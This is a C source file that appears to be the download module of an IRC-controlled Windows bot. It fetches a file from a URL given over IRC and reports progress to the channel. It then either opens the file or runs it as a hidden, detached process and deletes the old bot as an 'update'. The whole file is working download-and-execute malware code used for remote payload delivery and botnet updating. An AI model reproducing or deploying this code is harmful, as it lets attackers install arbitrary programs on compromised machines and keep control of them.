#include "includes.h"
#include "externs.h"

#ifndef NO_DOWNLOAD
DWORD WINAPI XDownloadThread(LPVOID lpParam)
{
	DOWNLOADTHREAD thread = *((DOWNLOADTHREAD *)lpParam);
	DOWNLOADTHREAD* xinfo = (DOWNLOADTHREAD *)lpParam;
	xinfo->Gotit = TRUE;

//	#ifndef INTERNET_OPEN_TYPE_PRECONFIG_WITH_NO_AUTOPROXY
//	#define INTERNET_OPEN_TYPE_PRECONFIG_WITH_NO_AUTOPROXY 4
//	#endif

	HINTERNET hInet = NULL, hFile = NULL;
	char Data[DATA_BUFFER] = {0};
	DWORD dwBytesRead = 0, Start = 0, End = 0, FileSize = 0, Speed = 0; 

	FILE* fp = NULL;

	hInet = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG_WITH_NO_AUTOPROXY, NULL, NULL, 0);
	if (!hInet)
	{
		XIRCMessage(thread.Session.irc->sock, TRUE, thread.Session.Notice, thread.Session.Silent, thread.Session.Destination, "[DOWNLOAD]: Failed to create session");

		goto end;
	}

	hFile = InternetOpenUrl(hInet, thread.Url, NULL, 0, 0, 0);
	if (!hFile)
	{
		InternetCloseHandle(hInet);

		XIRCMessage(thread.Session.irc->sock, TRUE, thread.Session.Notice, thread.Session.Silent, thread.Session.Destination, "[DOWNLOAD]: Bad url or dns error");

		goto end;
	}

	fp = fopen(thread.Destination, "wb");


	if (thread.Type != 2)
		XIRCMessage(thread.Session.irc->sock, TRUE, thread.Session.Notice, thread.Session.Silent, thread.Session.Destination, "[DOWNLOAD]: Downloading File: %s -> %s", thread.Url, thread.Destination);
	else
		XIRCMessage(thread.Session.irc->sock, TRUE, thread.Session.Notice, thread.Session.Silent, thread.Session.Destination, "[DOWNLOAD]: Downloading Update: %s -> %s", thread.Url, thread.Destination);

	Start = GetTickCount();

	do
	{
		if (!InternetReadFile(hFile, (LPVOID)Data, sizeof(Data), &dwBytesRead))
		{
			InternetCloseHandle(hFile);
			InternetCloseHandle(hInet);
			fclose(fp);
			DeleteFile(thread.Destination);			

			XIRCMessage(thread.Session.irc->sock, TRUE, thread.Session.Notice, thread.Session.Silent, thread.Session.Destination, "[DOWNLOAD]: Downloading Failed");

			goto end;		
		}

		if (dwBytesRead)
		{
			fwrite(Data, dwBytesRead, 1, fp);
			FileSize += dwBytesRead; 	  
		}

		if (thread.Type == 2) 
			XThreadTitle(thread.Threadnum, "[DOWNLOAD]: Downloading Update: %s, %dkb transferred!", thread.Url, FileSize / 1024);
		else
			XThreadTitle(thread.Threadnum, "[DOWNLOAD]: Downloading File: %s, %dkb transferred!", thread.Url, FileSize / 1024);
		
		Sleep(10);

	} while (dwBytesRead > 0);

	InternetCloseHandle(hFile);
	InternetCloseHandle(hInet);				

   	
	if (thread.FileLength)
	{
		if (FileSize != thread.FileLength)
		{
			DeleteFile(thread.Destination);

			XIRCMessage(thread.Session.irc->sock, TRUE, thread.Session.Notice, thread.Session.Silent, thread.Session.Destination, "[DOWNLOAD]: Filesize is incorrect! Recevied: %d bytes, Expected: %d bytes", FileSize, thread.FileLength);
			
			goto end;
		}
	}

	if (!FileSize)
	{
		DeleteFile(thread.Destination);

		XIRCMessage(thread.Session.irc->sock, TRUE, thread.Session.Notice, thread.Session.Silent, thread.Session.Destination, "[DOWNLOAD]: Downloading Failed");

		goto end;
	}
	else
	{
		Speed = FileSize/(((GetTickCount() - Start) / 1000) + 1);

		XIRCMessage(thread.Session.irc->sock, TRUE, thread.Session.Notice, thread.Session.Silent, thread.Session.Destination, "[DOWNLOAD]: Downloaded %.1f KB to %s @ %.1f KB/sec.", FileSize / 1024.0, thread.Destination, Speed / 1024.0);

		if (thread.Type == 1)
		{
			ShellExecute(0, "open", thread.Destination, NULL, NULL, SW_SHOW);

			XIRCMessage(thread.Session.irc->sock, TRUE, thread.Session.Notice, thread.Session.Silent, thread.Session.Destination, "[DOWNLOAD]: Opened: %s", thread.Destination);

			goto end;
		}
		else if (thread.Type == 2)
		{
			PROCESS_INFORMATION p;
			STARTUPINFO s;
			memset(&p, 0, sizeof(p));
			memset(&s, 0, sizeof(s));
					
			s.cb = sizeof(s);
			s.lpTitle = Version;

			s.wShowWindow = SW_HIDE;

			if (CreateProcess(thread.Destination, NULL, NULL, NULL, TRUE, IDLE_PRIORITY_CLASS | DETACHED_PROCESS, NULL, MainStruct.StartupDirectory, &s, &p))
			{
			//	CloseHandle(MainStruct.MainMutex);
			
				Sleep(100);
				
			//	Sleep(500);

				XRemove("Updating...");
			}
			else
			{
				DeleteFile(thread.Destination);

				XIRCMessage(thread.Session.irc->sock, TRUE, thread.Session.Notice, thread.Session.Silent, thread.Session.Destination, "[DOWNLOAD]: Update failed: Error Executing: %s", thread.Destination);

				goto end;
			}
		}
	}
end:

	XKillThread(thread.Threadnum, TRUE , FALSE);

	memset(&thread, 0, sizeof(thread));

	ExitThread(0);
}
#endif